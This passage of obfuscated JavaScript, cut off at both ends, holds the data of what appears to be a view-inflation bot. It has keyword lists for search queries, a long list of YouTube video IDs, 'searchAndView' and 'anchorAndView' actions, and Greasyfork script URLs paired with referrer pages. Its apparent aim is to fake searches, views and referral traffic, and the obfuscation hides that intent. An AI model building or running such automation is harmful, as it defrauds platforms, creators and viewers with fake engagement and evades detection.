    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + Z(0x13, '$oif') + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + a0(0xc) + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xd06 + 0x6d * -0x53 + 0x61 * 0x3b)), searchTerms['push'](['moomoo.io\x20' + 'spyder'][a1(0x1e) + 'nd'](0x1 * 0x18fd + -0x146f * -0x1 + 0x2 * -0x16b1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0x50d + 0x26ba + 0x10d5 * -0x2);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    a1(0xf) + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    a0(0x20) + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    a0(0xd) + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    a0(0x4) + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    a0(0x15) + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    a1(0x14) + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    a0(0x23) + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + Z(0x12, '$oif') + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0x3) + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + a1(0x19),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + Z(0x24, '$)(l'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + a1(0xb) + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + a1(0x1b) + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + Z(0x1c, '$)(l') + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + Z(0x11, 'xaW!') + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
